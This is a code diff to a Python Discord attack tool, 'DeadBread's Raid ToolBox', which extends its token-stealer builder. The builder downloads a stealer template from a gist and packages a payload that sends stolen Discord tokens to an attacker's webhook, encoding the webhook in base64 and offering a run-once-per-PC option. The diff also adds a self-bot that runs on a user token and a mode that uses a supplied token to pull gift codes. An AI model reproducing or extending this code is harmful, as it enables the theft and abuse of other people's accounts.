@@ -1381,7 +1381,7 @@ elif mode == "StealerBuilder":
         else:
             os.chdir('RTBStealerBuilder/')
             pyname = name+'.py'
-            temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/050466a1965847c423e24d0d59574c8a4ad97ad9/stealertemplate.py").text
+            temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/5405f4123165e528bd329e821e7c7921846d2a4c/stealertemplate.py").text
             with open("template.py", "w+") as handle:
                 handle.write(temp)
             with open("template.py") as f:
@@ -1409,31 +1409,54 @@ elif mode == "StealerBuilder":
             print("Finished!")
             window.Refresh()
     layout = [
-            [sg.Text('Output Name', size=(10, 1)), sg.Input(size=(10, 1))],
-            [sg.Text('Webhook', size=(10, 1)), sg.Input(size=(50, 1)), sg.Checkbox('Use Icon?')],
-            [sg.Text('Icon', size=(10, 1)), sg.InputText(size=(50, 1)), sg.FileBrowse(button_color=theme['button_colour'], file_types=(("Icon Files", "*.ico"),("All Files", "*.*")))],
-            [sg.Text('Run Once Per PC', size=(13, 1)), sg.Combo(['True','False'], default_value="True", key="Run", tooltip="Only Run once per PC to prevent spam.", readonly=True), sg.Text('Close Discord', size=(10, 1)), sg.Combo(['True','False'], default_value="False", key="Close", tooltip="Close Discord on Run. (NOT STEALTHY)", readonly=True)],
+            [sg.Text('Output Name', size=(10, 1)), sg.Input(size=(10, 1), key="namea")],
+            [sg.Text('Webhook', size=(10, 1)), sg.Input(size=(50, 1), key="Webhook"), sg.Button('Test', size=(6,1))],
+            [sg.Text('Icon', size=(10, 1)), sg.InputText(size=(50, 1), key="iconpath"), sg.FileBrowse(button_color=theme['button_colour'], file_types=(("Icon Files", "*.ico"),("All Files", "*.*")), size=(6,1))],
+            [sg.Text('Run Once Per PC', size=(13, 1)), sg.Combo(['True','False'], default_value="True", key="Run", tooltip="Only Run once per PC to prevent spam.", readonly=True), sg.Text('Close Discord', size=(10, 1)), sg.Combo(['True','False'], default_value="False", key="Close", tooltip="Close Discord on Run. (NOT STEALTHY)", readonly=True), sg.Checkbox('Use Icon', key="Useicon")],
             [sg.Output(size=(80, 15))],
             [sg.Button('Build', size=(35, 1), button_color=theme['button_colour']), sg.Exit(size=(35, 1), button_color=theme['button_colour'])]
             ]
     window = sg.Window("RTB | DeadBread's Token Stealer Builder v 0.2.0", layout)
     while True:
         event, values = window.Read(timeout=0)
-        if event is None:
+        if event is None or event == 'Exit':
             break
         elif event == sg.TIMEOUT_KEY:
             window.Refresh()
+        elif event == "Test":
+            payload = {
+            "username": "Raid ToolBox",
+            "avatar_url": 'https://i.imgur.com/TioPl63.png',
+            "content": "Test, Sent From Raid ToolBox"
+            }
+            try:
+                src = requests.post(values["Webhook"], json=payload).text
+                if src == "":
+                    pass
+                else:
+                    j = ast.literal_eval(src)
+                    try:
+                        j['message']
+                    except Exception:
+                        pass
+                    else:
+                        print(j['message'])
+                        error
+            except Exception as e:
+                print("Error Sending Payload")
+            else:
+                print("Sent Payload!")
         elif event == "Build":
-            if values[0] == '':
+            if values["namea"] == '':
                 sg.PopupNonBlocking('Invalid Name!')
                 continue
-            if values[1] == '':
+            if values["Webhook"] == '':
                 sg.PopupNonBlocking('No webhook entered!')
                 continue
-            name = values[0]
-            webhook = base64.b64encode(values[1].encode()).decode()
-            useicon = values[2]
-            icon = values[3]
+            name = values["namea"]
+            webhook = base64.b64encode(values["Webhook"].encode()).decode()
+            useicon = values["Useicon"]
+            icon = values["iconpath"]
             runonce = values['Run']
             killdisc = values['Close']
             build()
@@ -1609,6 +1632,145 @@ elif mode == "Logintoken":
             """
     driver.get("https://canary.discordapp.com/login")
     driver.execute_script(script+'\nlogin("{}")'.format(sys.argv[6]))
+
+elif mode == "DDDC":
+    import discord
+    import asyncio
+    import re
+    token = sys.argv[6]
+    client = discord.Client()
+    @client.event
+    async def on_message(message):
+        number = random.randint(1,51)
+        if 'sayori' in message.content.lower() and message.author == client.user:
+            if random.randint(1,3) == 1:
+                file = await message.channel.send(file=discord.File("RTBFiles/DDDC/ŞêýåŅĶäûų.png"))
+                await asyncio.sleep(0.7)
+                await file.delete()
+            gtext = []
+            text = ('¡¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿĀāĂăĄąĆćĈĉĊċČčĎďĐđĒēĔĕĖėĘęĚěĜĝĞğĠġĢģĤĥĦħĨĩĪīĬĭĮįİıĲĳĴĵĶķĸĹĺĻļĽľĿŀŁłŃńŅņŇňŉŊŋŌōŎŏŐőŒœŔŕŖŗŘřŚśŜŝŞşŠšŢţŤťŦŧŨũŪūŬŭŮůŰűŲųŴŵŶŷŸŹźŻżŽž')
+            for char in text:
+                gtext.append(char)
+            dokitext = ''
+            for x in range(15):
+                gchar = random.choice(gtext)
+                dokitext += gchar
+            text = message.content.lower()
+            text = re.sub(r'sayori', dokitext, text)
+            try:
+                await message.edit(content=str(text))
+            except Exception as e:
+                print (e)
+
+        if number == 50 and message.author == client.user:
+            glitchy = ""
+            for x in range(1000):
+                num = random.randrange(9999)
+                glitchy = glitchy + chr(num)
+            try:
+                await message.edit(content=str(glitchy))
+                await asyncio.sleep(random.randint(1,11))
+                await message.delete()
+            except Exception as e:
+                print (e)
+
+        if 'monika' in message.content.lower() and message.author == client.user:
+            monika = "JUST MONIKA"
+            for char in monika:
+                try:
+                    await message.edit(content=str(char))
+                    await asyncio.sleep(1)
+                except Exception as e:
+                    print (e)
+            mon = ''
+            for char in monika:
+                mon += char
+                try:
+                    await message.edit(content=str(mon))
+                    await asyncio.sleep(1)
+                except Exception as e:
+                    print (e)
+            gtext = []
+            text = ('¡¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿĀāĂăĄąĆćĈĉĊċČčĎďĐđĒēĔĕĖėĘęĚěĜĝĞğĠġĢģĤĥĦħĨĩĪīĬĭĮįİıĲĳĴĵĶķĸĹĺĻļĽľĿŀŁłŃńŅņŇňŉŊŋŌōŎŏŐőŒœŔŕŖŗŘřŚśŜŝŞşŠšŢţŤťŦŧŨũŪūŬŭŮůŰűŲųŴŵŶŷŸŹźŻżŽž')
+            for char in text:
+                gtext.append(char)
+            for x in range(3):
+                dokitext = ''
+                for x in range(15):
+                    gchar = random.choice(gtext)
+                    dokitext += gchar
+                await message.edit(content=str(dokitext))
+            await message.delete()
+
+        if 'happy' in message.content.lower() and message.author == client.user:
+            if random.randint(1,3) == 1:
+                file = await message.channel.send(file=discord.File("RTBFiles/DDDC/HAPPY.jpg"))
+                await asyncio.sleep(random.randint(1,11))
+                await file.delete()
+
+        if number == 18 and message.author == client.user:
+            original = str(message.content)
+            monika = ('**JUST**','**MONIKA**','**JUST MONIKA**','**Mo**','**nika**','**Ju**','**st**')
+            glitchy = ""
+            for x in range(300):
+                num = random.randrange(9999)
+                if random.randint(1,3) == 1:
+                    glitchy = glitchy + random.choice(monika)
+                glitchy = glitchy + chr(num)
+            try:
+                await asyncio.sleep(1)
+                await message.edit(content=str(glitchy))
+                await asyncio.sleep(random.randint(1,11))
+                await message.edit(content=str(original))
+            except Exception:
+                pass
+
+        if number == 21 and message.author == client.user:
+            files = ["RTBFiles/DDDC/iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii.txt","RTBFiles/DDDC/hxppy thxughts.png","RTBFiles/DDDC/CAN YOU HEAR ME.txt","RTBFiles/DDDC/monika.chr","RTBFiles/DDDC/traceback.txt"]
+            gtext = []
+            text = ('¡¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿĀāĂăĄąĆćĈĉĊċČčĎďĐđĒēĔĕĖėĘęĚěĜĝĞğĠġĢģĤĥĦħĨĩĪīĬĭĮįİıĲĳĴĵĶķĸĹĺĻļĽľĿŀŁłŃńŅņŇňŉŊŋŌōŎŏŐőŒœŔŕŖŗŘřŚśŜŝŞşŠšŢţŤťŦŧŨũŪūŬŭŮůŰűŲųŴŵŶŷŸŹźŻżŽž')
+            for char in text:
+                gtext.append(char)
+            for x in range(3):
+                dokitext = ''
+                for x in range(15):
+                    gchar = random.choice(gtext)
+                    dokitext += gchar
+            file = await message.channel.send(content=str(dokitext), file=discord.File(random.choice(files)))
+            await asyncio.sleep(random.randint(1,21))
+            await file.delete()
+    client.run(token, bot=False)
+
+elif mode == "Gifts":
+    gifts = {}
+    headers = {'Authorization': sys.argv[6], 'Content-Type': 'application/json'}
+    src = requests.get("https://canary.discordapp.com/api/v6/users/@me/entitlements/gifts", headers=headers)
+    s = json.loads(src.content)
+    for app in s:
+        gifts[app["subscription_plan"]["name"]] = str({"sku_id": app["sku_id"], "id": app["subscription_plan"]["id"]})
+    layout = [
+             [sg.Text("Available Gifts")]
+             ]
+    for g in gifts:
+        layout.append([sg.Text(g, size=(50,1)), sg.Button("Take",key=g)])
+    window = sg.Window("DeadBread's Raid ToolBox | Gift Inventory").Layout(layout)
+    while True:
+        event, values = window.Read()
+        if event is None:
+            break
+        elif event in list(gifts):
+            g = ast.literal_eval(gifts[event])
+            payload = {"sku_id": g['sku_id'],"subscription_plan_id": g["id"]}
+            src = requests.post("https://canary.discordapp.com/api/v6/users/@me/entitlements/gift-codes", headers=headers, json=payload)
+            f = json.loads(src.content)
+            if f['code'] == 30022:
+                sg.Popup("Maximum number of gifts has been reached for this SKU.", title="Code 30022")
+            else:
+                sg.PopupScrolled("https://discord.gift/{}".format(f['code']))
+                with open("GIFT_CODES.txt", "a+") as handle:
+                    handle.write("https://discord.gift/{}\n".format(f['code']))
+
+
 
 elif mode == 'ree':
     picdata = requests.get("https://gist.githubusercontent.com/DeadBread76/3d93e55fe4a9e4c7324c2f0b13cf24ac/raw/7d433bb5187c5d2c1fc74c310ff0638790491c87/Special%2520surprise.txt")
